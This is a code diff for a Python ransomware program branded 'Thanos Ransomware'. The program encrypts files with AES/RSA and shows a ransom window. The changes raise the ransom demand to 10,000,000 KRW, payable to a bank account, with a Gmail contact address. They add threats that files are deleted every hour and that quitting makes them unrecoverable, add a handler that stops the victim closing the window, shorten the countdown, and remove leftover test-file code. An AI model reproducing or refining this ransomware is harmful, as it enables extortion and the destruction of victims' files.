@@ -1,3 +1,5 @@
+from tkinter import messagebox
+
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto import Random
@@ -15,6 +17,8 @@ import tkinter
 from tkinter.ttk import Label
 from PIL import Image, ImageTk
 
+
+#self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
 iv = os.urandom(16)
 
 def enc(key, cipher, in_filename, out_filename=None):
@@ -202,11 +206,16 @@ class MyTk:
         self.window.configure(background="black")
 
         self.l_text = tkinter.Label(self.window,
-                                    text="\nYour computer files have been encrypted."
+                                    text="\nYOUR FILES HAVE BEEN ENCRYPTED."
                                          "\nYour photos, documents, etc..."
                                          "\nBut, don't worry! I have not deleted them yet :D"
-                                         "\nYou have some time to pay 200USD in this account(KB 786102-00-040854) to get the decryption key."
+                                         "\nYou have some time to pay 10,000,000KRW in this account(KB 786102-00-040854) to get the decryption key."
+                                         "\nif you send money, send an e-mail with your account at this address."
+                                         "\nOur e-mail address: secureantdd@gmail.com"
                                          "\nEvery hour half of all files will be deleted."
+                                         "\n--WARNING--"
+                                         "\nDo not force-terminate this program."
+                                         "\nYou will NEVER decrypt your files."
                                          "\n",
                                     fg="green", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
@@ -230,6 +239,10 @@ class MyTk:
         self.l_thanos = tkinter.Label(self.window, image=self.thanos, borderwidth=0, compound="center",
                                       highlightthickness=0)
         self.l_thanos.pack()
+
+    def disable_event(self):
+        messagebox.showinfo(title="Thanos Ransomware", message="You can't leave this window.")
+        pass
 
     def keySubmit(self):
         self.pw = str(self.password.get())
@@ -301,7 +314,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 300, antdd_filelist)
+    clock(gui, 10, antdd_filelist)
 
 def clock(gui, c, antdd_filelist):
     c -= 1
@@ -422,11 +435,6 @@ class RealMain:
                     self.myGui.finalGui()
 
 if __name__ == "__main__":
-
-    # @@ 이거 진짜 지워야하는데
-    for i in range(5):
-        with open("test" + str(i) + '.txt', 'wb') as testfile:
-            testfile.write('테스트입니다'.encode())
 
     r = RealMain()
     r.run()
